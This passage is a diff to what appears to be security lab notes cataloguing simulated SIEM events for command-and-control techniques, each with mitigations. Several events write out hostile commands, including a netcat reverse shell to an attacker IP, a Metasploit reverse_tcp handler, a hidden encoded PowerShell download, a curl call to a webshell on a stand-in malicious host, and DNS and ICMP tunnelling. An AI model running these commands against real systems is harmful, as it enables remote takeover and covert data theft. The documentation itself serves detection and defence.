@@ -280,7 +280,63 @@ Event 10: This is a type of Nmap SYN Scan that uses the command "nmap -sS -p 1-6
 - Source IP: 192.168.1.100
 - Target IP: 192.168.1.1
 
+# Mitigation:
 
+- Active Monitoring: Configure SIEM rules to alert on network scans and correlate events.
+- Firewall and ACLs: Restrict access to critical ports and apply access control lists.
+- Network Segmentation: Separate internal networks and limit access to essential services.
+- IDS/IPS: Implement intrusion detection/prevention systems to block suspicious activity.
+- Service Hardening: Disable unnecessary protocols and strengthen security settings on servers and network devices.
+
+# Command & Control
+![(Command&Control]
+
+Event 1: The technique used is "Reverse Shell" by executing the command "nc -e /bin/bash 192.168.1.200 4444". This command uses Netcat to create a reverse shell, redirecting /bin/bash to the attacking host (192.168.1.200) on port 4444, allowing remote control of the compromised system.
+- Source IP: 192.168.1.100
+- Target IP: 192.168.1.200
+
+Event 2: The technique used is "Meterpreter Session" by executing the command "msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; run"". This command starts the Metasploit Framework (msfconsole) and executes a handler that listens for incoming connections from a Meterpreter session with a reverse_tcp payload, allowing an attacker to take remote control of a compromised machine.
+- Source IP: 192.168.1.105
+- Target IP: 192.168.1.1
+
+Event 3: The technique used is "PowerShell Empire" by executing the command "powershell -NoP -W Hidden -Enc BASE64_ENCODED_PAYLOAD". This command uses PowerShell to download and execute a remote script from a malicious server without displaying a visible window, allowing arbitrary code execution on the system.
+- Source IP: 192.168.1.101
+- Target IP: 192.168.1.1
+
+Event 4: The technique used is "DNS Tunneling" by executing the command "iodine -f -P password 192.168.1.1". It establishes a covert communication tunnel using DNS traffic to bypass firewall restrictions and connect to a remote server at 192.168.1.1.
+- Source IP: 192.168.1.102
+- Target IP: 192.168.1.1
+
+Event 5: The technique used is "HTTPS Beacon" by executing the command "Cobalt Strike HTTPS beacon". The "Cobalt Strike HTTPS beacon" event indicates the use of the Cobalt Strike tool to establish communication with a command and control server over HTTPS. This technique is used to evade detection through encryption and seemingly legitimate traffic.
+- Source IP: 192.168.1.154
+- Target IP: 192.168.1.200
+
+Event 6: The technique used is "WebShell Access," executing the command "curl -X POST -d 'cmd=whoami' http://malicious-site.com/webshell.php." It sends a command to a malicious webshell to execute on the server. - Source IP: 192.168.1.155
+- Target IP: 192.168.1.200
+
+Event 7: The technique used is "SSH Tunneling" by executing the command "ssh -R 8080:localhost:80 attacker@192.168.1.200". It creates an SSH tunnel to redirect traffic through the attacker.
+- Source IP: 192.168.1.156
+- Target IP: 192.168.1.200
+
+Event 8: The technique used is "ICMP C2 Channel" by executing the command "ping -c 1 -p 'secretdata' 192.168.1.200". It uses ICMP packets to transmit covert data.
+- Source IP: 192.168.1.157
+- Target IP: 192.168.1.200
+
+Event 9: The technique used is "SMB C2 Channel" by executing the command "smbclient //192.168.1.200/share -U user%pass". It uses SMB to access a malicious share.
+- Source IP: 192.168.1.158
+- Target IP: 192.168.1.200
+
+Event 10: The technique used is "Tor Proxy Connection" by executing the command "tor --client --proxy 192.168.1.200:9050". It establishes an anonymous proxy connection through the Tor network.
+- Source IP: 192.168.1.159
+- Target IP: 192.168.1.200
+
+# Mitigations:
+- Monitoring and Detection: Configure SIEM rules to alert on unusual traffic patterns and known C2 connections.
+- Firewall and ACLs: Restrict access to unnecessary ports, especially 22 (SSH), 3389 (RDP), and 445 (SMB).
+- Network Segmentation: Implement VLANs and microsegmentation to limit lateral movement.
+- Malicious Domain Blocking: Implement blacklists and DNS filtering to prevent connections to C2 servers.
+- Tunneling Detection: Inspect DNS, ICMP, and HTTPS traffic to identify anomalous communication patterns.
+- Auditing and Hardening: Enforce strong password policies and monitor administrative accounts.
 
 
 
